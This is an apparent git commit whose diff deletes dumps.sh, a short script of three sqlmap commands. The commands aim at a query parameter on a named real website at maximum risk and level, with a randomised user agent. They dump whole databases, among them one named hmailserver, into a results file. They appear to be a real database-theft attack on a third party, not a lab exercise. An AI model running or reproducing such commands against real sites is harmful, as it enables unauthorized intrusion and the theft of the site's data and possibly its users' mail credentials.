00cf0af10b0b24d72fb6c4bca0c074fb11890e7f
root <root@vultr.guest>
2019-11-04 22:38:25 +0000

    data

--- dumps.sh
+++
@@ -1,5 +0,0 @@
-python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_dcb --dump >> result.txt ;
-python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D cariat_rob --dump >> result.txt ; 
-python ../sqlmap/sqlmap.py -u "https://congresbalie.cariat.nl/informatie.asp?id=C191115&lang=EN" --risk 3 --level 5 --batch --random-agent -D hmailserver --dump >> result.txt ;
-echo "ok"
-
